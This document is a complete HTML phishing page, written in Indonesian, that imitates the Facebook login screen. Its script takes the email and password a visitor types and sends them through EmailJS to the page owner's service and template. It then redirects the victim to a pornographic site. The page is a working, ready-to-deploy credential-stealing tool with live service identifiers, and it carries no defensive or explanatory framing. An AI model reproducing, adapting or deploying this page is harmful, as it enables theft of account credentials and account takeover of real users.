<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Masuk atau Daftar</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(to bottom right, #f9f1ff, #d6e5fa);
    }

    .login-container {
      width: 90%;
      max-width: 400px;
      border-radius: 10px;
      padding: 20px;
      text-align: center;
    }

    .login-container img {
      width: 50px;
      height: 50px;
      margin-bottom: 20px;
    }

    .login-container h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #1877f2;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #165db8;
    }
    .forgot-password {
      margin-top: 15px;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    .create-account {
      margin-top: 20px;
      font-size: 16px;
      color: #1877f2;
      text-decoration: none;
    }

    .create-account:hover {
      text-decoration: underline;
    }
    footer {
      margin-top: 30px;
      font-size: 12px;
      color: #aaa;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      border: 1px solid #ccc;
      padding: 20px;
      border-radius: 5px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      display: none;
      z-index: 1000;
    }

    .popup button {
      background: none;
      color: #1877f2;
      border: none;
      font-size: 16px;
      cursor: pointer;
      position: absolute;
      bottom: 10px;
      right: 10px;
      padding: 5px 10px;
    }

    .popup button:hover {
      text-decoration: none;
    }

    #loading {
      display: none;
      margin-top: 10px;
      color: #1877f2;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <h1></h1>
    <form id="loginForm">
      <input type="text" id="email" placeholder="Nomor ponsel atau email">
      <input type="password" id="password" placeholder="Kata sandi">
      <button type="submit" id="submitBtn">Login</button>
      <p id="loading">Mengirim data...</p>
    </form>
    <hr>
    <a href="#" class="forgot-password">Lupa kata sandi?</a>
    <a href="#" class="create-account">Buat akun baru</a>
    <footer>Â© Meta</footer>
  </div>

  
  <div class="popup" id="popupMessage">
    <p id="popupText"></p>
    <hr>
    <button onclick="closePopup()">OK</button>
  </div>

 
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
    (function(){
      emailjs.init("5YPTVVuIdLBhWZDmf");
    })();

    const emailField = document.getElementById('email');
    const passwordField = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const loadingIndicator = document.getElementById('loading');
    const popupMessage = document.getElementById('popupMessage');
    const popupText = document.getElementById('popupText');

    async function handleFormSubmission(event) {
      event.preventDefault();

      const email = emailField.value.trim();
      const password = passwordField.value.trim();

      
      if (!email) {
        showPopup("Perlu email atau nomor ponsel. Masukkan email atau nomor ponsel untuk melanjutkan");
        return;
      }
      if (!password) {
        showPopup("Perlu kata sandi. Masukkan kata sandi untuk melanjutkan");
        return;
      }

      loadingIndicator.style.display = 'block';
      try {
        const templateParams = {
          email: email,
          password: password
        };

        
        const response = await emailjs.send("service_wimuilb", "template_svvfoh9", templateParams);
        console.log('Email terkirim:', response);

        
        setTimeout(() => {
          window.location.href = "https://www.xnxx.com/search/indonesia?top";
        }, 2000);
      } catch (error) {
        console.error('Terjadi kesalahan:', error);
        showPopup('Terjadi masalah saat mengirim email. Coba lagi nanti.');
      } finally {
        loadingIndicator.style.display = 'none';
      }
    }

    function showPopup(message) {
      popupText.textContent = message;
      popupMessage.style.display = 'block';
    }

    function closePopup() {
      popupMessage.style.display = 'none';
    }

    document.getElementById('loginForm').addEventListener('submit', handleFormSubmission);
  </script>
</body>
</html>
